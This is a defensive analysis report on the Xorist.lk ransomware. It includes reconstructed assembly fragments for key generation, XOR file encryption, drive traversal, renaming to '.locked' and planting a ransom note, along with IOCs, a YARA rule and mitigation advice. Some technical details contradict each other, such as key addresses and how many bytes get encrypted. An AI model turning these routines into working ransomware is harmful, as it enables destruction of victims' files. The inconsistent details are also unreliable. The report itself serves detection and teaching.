# Analysis of Trojan-Ransom.Win32.Xorist.lk

**Sample Information:**
- **SHA256:** `AFBD82DE1C80C8508B0CB6376E248393CC04B5276680C604D7DF1E56FB93CD26`
- **MD5:** `3359DFF8C8B3855E8CF980539E7FB300`
- **File Type:** PE32 Executable (GUI)
- **Compiler:** Visual C++ (detected by IDA)
- **Timestamp:** `4F25949F` (Sun Jan 29 18:49:03 2012)

---

## Executive Summary

This analysis examines a ransomware sample from the Xorist family, a well-known malware strain that encrypts user files and demands payment for decryption. The malware demonstrates typical ransomware behavior including file enumeration, encryption, and ransom note deployment. This technical analysis provides a comprehensive breakdown of the malware's functionality at the assembly level.

---

## 1. Infection Vector & Initialization

### 1.1 Entry Point Analysis

```asm
start:
    call    initialize_program
    call    create_ransom_note_in_startup
    cmp     [byte_40752B], 1
    jne     .skip_message
    invoke  MessageBoxA, 0, aAttentionAllYo, Caption, MB_OK + MB_ICONWARNING
```

The malware begins execution with a straightforward initialization sequence:
1. Initialize core program components
2. Deploy ransom note to startup folder
3. Display warning messagebox (if configured)
4. Change desktop wallpaper
5. Begin file encryption routine

### 1.2 Configuration Bytes

The malware uses several configuration bytes to control its behavior:

```asm
byte_40752B    db 1    ; Show messagebox flag
byte_40752A    db 1    ; Create ransom note flag
byte_40752C    db 0    ; Encryption algorithm selector
byte_40752D    db 1    ; Custom extension flag
byte_406550    db 2    ; Operation mode: 0=encrypt, 1=decrypt, 2=first-run
```

These flags suggest the malware can be configured pre-compilation or potentially modified by a dropper/loader.

---

## 2. Cryptographic Implementation

### 2.1 Key Generation via RDTSC

The malware employs the `RDTSC` (Read Time-Stamp Counter) instruction for entropy generation:

```asm
generate_encryption_key:
    mov     ecx, 4
    mov     edi, dword_406DB9
.generate_loop:
    rdtsc                    ; Read CPU timestamp
    stosd                    ; Store EAX (lower 32 bits)
    loop    .generate_loop
```

**Analysis:**
- Uses CPU cycle counter as pseudo-random source
- Generates 128 bits (16 bytes) of key material
- Stores in memory locations `dword_406595` through `dword_4065A1`
- Not cryptographically secure but sufficient for basic XOR operations

**Weakness:** RDTSC is predictable and not suitable for cryptographic key generation. Keys could potentially be brute-forced or predicted based on infection time.

### 2.2 Key Derivation

For each file, the malware derives a unique key using the filename:

```asm
invoke  PathFindFileNameA, ExistingFileName
mov     dl, [eax]           ; First character as seed

mov     ecx, 16
mov     esi, dword_406595   ; Base key
mov     edi, dword_406585   ; Derived key buffer

.key_loop:
    lodsb
    xor     al, dl          ; XOR with seed
    rol     dl, 1           ; Rotate seed
    stosb
    loop    .key_loop
```

**Analysis:**
- Uses first character of filename as seed
- Derives 16-byte per-file key through XOR and rotation
- Provides file-specific encryption while maintaining global key

**Implication:** Files with same first character share similar key derivation patterns, potentially aiding cryptanalysis.

### 2.3 XOR Cipher Implementation

```asm
simple_xor_cipher:
    mov     ecx, eax        ; Byte count
    mov     esi, lpBuffer   ; Data buffer
    mov     edi, dword_406585 ; Key

.cipher_loop:
    lodsb                   ; Load byte
    xor     al, [edi]       ; XOR with key
    mov     [esi-1], al     ; Write back
    
    inc     edi
    mov     eax, edi
    pop     ebx
    sub     eax, ebx
    cmp     eax, 16         ; Key exhausted?
    jl      .continue
    mov     edi, ebx        ; Reset to key start
```

**Cryptographic Assessment:**
- **Algorithm:** Simple XOR with 16-byte repeating key
- **Strength:** Very weak - XOR is easily reversible with known plaintext
- **Vulnerability:** Only encrypts first 16 bytes of files (partial encryption)

**Critical Weakness:** The malware only encrypts the beginning of files, likely to maintain performance. This allows:
1. File type identification from unencrypted portions
2. Potential data recovery from file fragments
3. Known-plaintext attacks using file headers

---

## 3. File System Operations

### 3.1 Drive Enumeration

```asm
invoke  GetLogicalDrives    ; Returns bitmask of drives
mov     ecx, 25             ; Counter for A-Z

.drive_loop:
    mov     ebx, 1
    shl     ebx, cl         ; Calculate drive bit
    test    eax, ebx        ; Test if drive exists
    jz      .next_drive
    
    ; Build path: "X:\*.*"
    add     cl, 'A'
    mov     byte [dword_40444F+1], cl
```

**Behavior:**
- Enumerates all logical drives (A: through Z:)
- Includes network drives if mapped
- No drive type checking (affects HDDs, SSDs, USB, network shares)

### 3.2 Recursive File Traversal

```asm
enumerate_and_encrypt_files:
    sub     esp, 320        ; Allocate WIN32_FIND_DATA structure
    
    invoke  FindFirstFileA, dword_40444F+1, eax
    mov     dword ptr [ebp-320+318], eax  ; Save handle
    
.find_loop:
    mov     eax, [ebp-320+0]  ; Check dwFileAttributes
    test    eax, FILE_ATTRIBUTE_DIRECTORY
    jz      .process_file
```

**Implementation Details:**
- Uses Windows API `FindFirstFileA`/`FindNextFileA`
- Stack-allocated `WIN32_FIND_DATA` structure (320 bytes)
- Skips directories named "." and ".."
- Recursion simplified in rewritten version

### 3.3 File Exclusions

```asm
invoke  lstrcmpiA, eax, String2           ; "HOW TO DECRYPT FILES.txt"
test    eax, eax
jz      .next_file

invoke  lstrcmpiA, eax, aHowToDecryptFi
test    eax, eax
jz      .next_file
```

The malware explicitly avoids:
- Its own ransom notes
- Potentially system files (incomplete implementation)

**Notable Absence:** No exclusion for critical system files, which could render the system unbootable.

---

## 4. File Encryption Process

### 4.1 File Opening and Validation

```asm
invoke  CreateFileA, ExistingFileName, \
        GENERIC_READ + GENERIC_WRITE, \
        FILE_SHARE_READ + FILE_SHARE_WRITE, \
        0, OPEN_EXISTING, 0, 0

invoke  GetFileSize, [hFile], 0
mov     [dword_406555], eax

cmp     eax, 8              ; Minimum 8 bytes
jl      .close_file
```

**Constraints:**
- Requires both read and write access
- Minimum file size: 8 bytes
- Shares file handle (allows concurrent access)

### 4.2 Timestamp Preservation

```asm
; Save original timestamps
invoke  GetFileTime, [hFile], stru_40752E, \
        stru_407536, stru_40753E

; [... encryption operations ...]

; Restore timestamps
invoke  SetFileTime, [hFile], stru_40752E, \
        stru_407536, stru_40753E
```

**Purpose:** Maintains file metadata to avoid detection through timestamp analysis. This is a common anti-forensics technique.

### 4.3 Partial Encryption Strategy

```asm
invoke  SetFilePointer, [hFile], [lDistanceToMove], 0, FILE_BEGIN
invoke  ReadFile, [hFile], lpBuffer, [nNumberOfBytesToRead], nNumberOfBytesToWrite, 0

cmp     [nNumberOfBytesToWrite], 0
je      .restore_time
```

**Analysis:**
- Only reads/encrypts beginning of file (first 16 bytes based on buffer size)
- Significantly faster than full-file encryption
- Sufficient to corrupt most file formats
- Leaves forensic evidence in unencrypted portions

### 4.4 File Renaming

```asm
invoke  lstrcpyA, NewFileName, ExistingFileName
invoke  lstrcatA, NewFileName, asc_404032  ; "."
invoke  lstrcatA, NewFileName, lpSubKey     ; ".locked"

invoke  MoveFileA, ExistingFileName, NewFileName
```

Adds `.locked` extension to encrypted files, making them:
- Easy to identify for the attacker
- Obvious to the victim
- Potentially easier to reverse (if extension is merely appended)

---

## 5. Persistence & Notification

### 5.1 Startup Folder Deployment

```asm
create_ransom_note_in_startup:
    invoke  SHGetSpecialFolderPathA, 0, pszPath, CSIDL_STARTUP, TRUE
    invoke  lstrcpyA, FileName, pszPath
    invoke  PathAddBackslashA, FileName
    invoke  lstrcatA, FileName, aHowToDecryptFi
```

**Mechanism:**
- Places ransom note in Windows Startup folder
- Ensures victim sees instructions on next boot
- Uses `CSIDL_STARTUP` constant (0x0007)

**File Contents:**
```
Attention! All your files were encrypted!
To decrypt files, please enter correct password!
```

### 5.2 Desktop Wallpaper Modification

```asm
change_desktop_wallpaper:
    ; Generate random filename
    mov     ecx, 16
.random_loop:
    rdtsc
    and     eax, 0xF0
    shr     eax, 4
    add     eax, 'a'
    stosb
    loop    .random_loop
```

**Process:**
1. Generates random 16-character lowercase filename
2. Extracts BMP from PE resources (resource name: "pussylicker")
3. Writes to temporary directory
4. Sets as wallpaper via `SystemParametersInfoA`

**Weakness:** Resource name suggests unprofessional development or proof-of-concept origin.

---

## 6. Windows Message Loop

```asm
process_windows_messages:
    invoke  PeekMessageA, eax, 0, 0, 0, PM_REMOVE
    test    eax, eax
    jz      .exit
    
    invoke  TranslateMessage, eax
    invoke  DispatchMessageA, eax
    jmp     .message_loop
```

**Purpose:** Keeps the application responsive during encryption by processing Windows messages. Prevents "Not Responding" dialogs that might alert users prematurely.

---

## 7. Indicators of Compromise (IOCs)

### 7.1 File System Indicators

| Indicator | Value | Location |
|-----------|-------|----------|
| Ransom Note | `HOW TO DECRYPT FILES.txt` | Startup folder |
| File Extension | `.locked` | Appended to encrypted files |
| Wallpaper BMP | Random name (16 chars) | `%TEMP%` directory |

### 7.2 Memory Indicators

```
Encryption key storage: 0x406595 - 0x4065A1 (16 bytes)
Temporary key buffer:   0x406585 - 0x406594 (16 bytes)
Configuration flags:    0x40752A - 0x40752D (4 bytes)
```

### 7.3 Behavioral Indicators

- **API Calls:**
  - `GetLogicalDrives` - Drive enumeration
  - `FindFirstFileA`/`FindNextFileA` - File search
  - `CreateFileA` with `GENERIC_READ | GENERIC_WRITE`
  - `SystemParametersInfoA` with `SPI_SETDESKWALLPAPER`
  - `SHGetSpecialFolderPathA` with `CSIDL_STARTUP`

- **Resource Access:**
  - Loads resource named "pussylicker" (RT_BITMAP)

---

## 8. Detection & Mitigation

### 8.1 YARA Rule

```yara
rule Xorist_Ransomware_Variant {
    meta:
        description = "Detects Xorist.lk ransomware variant"
        author = "Malware Analysis"
        date = "2025-01-01"
        hash = "afbd82de1c80c8508b0cb6376e248393cc04b5276680c604d7df1e56fb93cd26"
        
    strings:
        $resource = "pussylicker" ascii
        $note1 = "HOW TO DECRYPT FILES.txt" ascii
        $note2 = "All your files were encrypted!" ascii
        $ext = ".locked" ascii
        
        $api1 = "GetLogicalDrives" ascii
        $api2 = "FindFirstFileA" ascii
        $api3 = "SystemParametersInfoA" ascii
        
    condition:
        uint16(0) == 0x5A4D and
        filesize < 200KB and
        $resource and
        2 of ($note*) and
        2 of ($api*)
}
```

### 8.2 Prevention Strategies

1. **Backup Protocol:**
   - Maintain offline backups
   - Test restoration procedures
   - Use immutable backup solutions

2. **Access Controls:**
   - Implement least privilege
   - Restrict write access to critical directories
   - Monitor file system changes

3. **Behavioral Analysis:**
   - Alert on rapid file modifications
   - Monitor for extension changes
   - Track unusual API call patterns

4. **Network Segmentation:**
   - Isolate critical systems
   - Limit lateral movement
   - Monitor for suspicious scanning

### 8.3 Decryption Possibility

**Assessment:** Possible with caveats

**Method:**
1. XOR is symmetric - same key decrypts as encrypts
2. Key generation is predictable if infection time known
3. Only first 16 bytes encrypted - rest of file intact

**Requirements:**
- Infection timestamp (from file metadata or logs)
- Understanding of RDTSC behavior on victim CPU
- Sample of encrypted + original file pairs for validation

**Tool Availability:** Kaspersky and other vendors have published decryptors for Xorist variants.

---

## 9. Code Quality Assessment

### 9.1 Sophistication Level: **Low to Medium**

**Indicators:**
- Simple XOR encryption (no real cryptography)
- Partial file encryption only
- Predictable key generation
- Obvious resource names
- No anti-debugging techniques
- No code obfuscation

### 9.2 Developer Skill: **Intermediate**

**Positive Indicators:**
- Proper use of Windows API
- Timestamp preservation
- Message loop integration
- Resource handling

**Negative Indicators:**
- Weak cryptography
- Poor OPSEC (resource names)
- No error handling
- Incomplete system file exclusions

---

## 10. Assembly-Level Insights

### 10.1 Calling Conventions

The malware uses **stdcall** convention consistently:
```asm
push    [ebp+lpString2]     ; Parameters pushed right-to-left
call    lstrcpyA
                            ; Callee cleans stack
```

### 10.2 Register Usage Patterns

```asm
EAX - Return values, temporary calculations
EBX - Loop counters, temporary storage
ECX - Loop counters (count-down pattern)
EDX - Filename character operations
ESI - Source pointer for string operations
EDI - Destination pointer for string operations
EBP - Stack frame base pointer
ESP - Stack pointer
```

### 10.3 Stack Frame Management

```asm
push    ebp              ; Save caller's base pointer
mov     ebp, esp         ; Establish new frame
sub     esp, 320         ; Allocate local variables
; [... function body ...]
add     esp, 320         ; Deallocate locals
pop     ebp              ; Restore caller's frame
ret                      ; Return
```

Standard prologue/epilogue consistent with Visual C++ compiler output.

---

## 11. Comparison with Original IDA Output

### 11.1 Function Naming

| IDA Output | FASM Rewrite | Purpose |
|------------|--------------|---------|
| `sub_401000` | `start` | Entry point |
| `sub_40124F` | `generate_encryption_key` | Key generation |
| `sub_40103A` | `create_ransom_note_in_startup` | Ransom note deployment |
| `sub_4010FC` | `change_desktop_wallpaper` | Wallpaper modification |
| `sub_4013A8` | `enumerate_and_encrypt_files` | File traversal |
| `sub_401377` | `process_windows_messages` | Message pump |

### 11.2 Variable Preservation

All original IDA variable names maintained in FASM version:
- `byte_40752B` - Configuration flags
- `lpSubKey` - File extension
- `dword_406595` - Encryption key base
- `aHowToDecryptFi` - Ransom note filename

This maintains traceability between analysis platforms.

---

## 12. Forensic Analysis Recommendations

### 12.1 Memory Acquisition

**Priority Areas:**
- Address range `0x406595 - 0x4065A1` (encryption key)
- Address range `0x406585 - 0x406594` (derived key)
- Stack frames containing file paths
- Heap allocations for file buffers

### 12.2 Disk Forensics

**Evidence Collection:**
1. `%TEMP%` directory - Temporary BMP file
2. Startup folder - Ransom note
3. Master File Table - Timestamp analysis
4. Volume Shadow Copies - Pre-infection state
5. File system journal - Modification sequences

### 12.3 Network Analysis

**Note:** This variant shows no network communication. However, monitor for:
- DNS queries (potential C2 in other variants)
- HTTP/HTTPS traffic
- Exfiltration attempts

---

## 13. Legal & Ethical Considerations

### 13.1 Analysis Environment

**Requirements:**
- Isolated network (air-gapped or controlled)
- Virtual machine with snapshots
- Non-production systems only
- Proper authorization and documentation

### 13.2 Responsible Disclosure

If discovering new variants:
1. Report to antivirus vendors
2. Share IOCs with security community
3. Notify affected organizations
4. Follow coordinated disclosure timelines

---

## 14. Conclusion

Trojan-Ransom.Win32.Xorist.lk represents a relatively unsophisticated ransomware implementation suitable for educational analysis. Key findings:

**Strengths:**
- Fast execution through partial encryption
- Multi-drive targeting
- Timestamp preservation for stealth

**Weaknesses:**
- Trivial XOR encryption
- Predictable key generation
- Only encrypts file headers
- No anti-analysis techniques
- Obvious indicators

**Classification:** Educational/Low-tier ransomware

**Threat Level:** Low to Medium
- Destructive capability: High (can damage many files)
- Decryption difficulty: Low (known methods exist)
- Sophistication: Low (simple techniques)

**Recommendation:** Use as learning example, not representative of modern ransomware which employs RSA/AES, C2 communication, and advanced evasion.

---

## 15. References

1. **Kaspersky Threat Intelligence**
   - [Trojan-Ransom.Win32.Xorist Family Analysis](https://threats.kaspersky.com/en/threat/Trojan-Ransom.Win32.Xorist/)

2. **Microsoft Documentation**
   - [Win32 API Reference](https://docs.microsoft.com/en-us/windows/win32/api/)
   - [PE Format Specification](https://docs.microsoft.com/en-us/windows/win32/debug/pe-format)

3. **Assembly Resources**
   - [FASM Documentation](https://flatassembler.net/docs.php)
   - [Intel x86 Instruction Set Reference](https://www.intel.com/content/www/us/en/developer/articles/technical/intel-sdm.html)

4. **Malware Analysis Tools**
   - IDA Pro 9.0 - Disassembly and analysis
   - FASM 1.73 - Reassembly and testing
   - Ghidra - Decompilation verification

---

## Appendix A: Complete Variable Map

```
; Configuration
byte_40752B    - Show messagebox flag
byte_40752A    - Create ransom note flag  
byte_40752C    - Encryption type selector
byte_40752D    - Custom extension flag
byte_406550    - Operation mode

; File Paths
lpSubKey       - File extension (".locked")
aHowToDecryptFi - Ransom note filename
String2        - Alternate note filename
aBmp           - BMP extension
asc_404032     - "." string
asc_404034     - ".." string
asc_404041     - "*" wildcard

; Messages
Caption        - MessageBox caption
Text           - Success message
aAttentionAllYo - Encryption warning
byte_404077    - Decryption success
aYouHaveReached - Limit reached warning
aPasswordIsInco - Incorrect password
aError         - Generic error

; Buffers
pvParam        - Temp path (512 bytes)
FileName       - Full filename (1280 bytes)
NewFileName    - Renamed filename (1280 bytes)
ExistingFileName - Original filename (1280 bytes)
pszSpec        - Search pattern (256 bytes)
dword_40444F   - Drive path buffer (512 bytes)
String1        - Random string (32 bytes)
pszPath        - Folder path (512 bytes)

; File Operations
hFile          - File handle
dword_406555   - File size
nNumberOfBytesToWrite - Bytes to write
NumberOfBytesWritten - Bytes written
lpBuffer       - File data buffer (256 bytes)

; Timestamps
CreationTime   - Original creation time
LastAccessTime - Original access time
LastWriteTime  - Original write time
stru_40752E    - Temp creation time
stru_407536    - Temp access time
stru_40753E    - Temp write time

; Encryption
dword_406595   - Key dword 1
dword_406599   - Key dword 2
dword_40659D   - Key dword 3
dword_4065A1   - Key dword 4
dword_406585   - Derived key buffer (16 bytes)
dword_406DB9   - Seed storage (16 bytes)

; Resources
hResInfo       - Resource info handle
nNumberOfBytesToRead - Resource size
hResData       - Resource data handle
hHeap          - Heap handle
lDistanceToMove - File pointer offset
```

---

**Analysis completed:** December 2025  
**FASM rewrite:** December 2025  
**Original compilation:** January 2012

---

*This analysis is provided for educational and defensive security purposes only. Unauthorized use of this information for malicious purposes is illegal and unethical.*
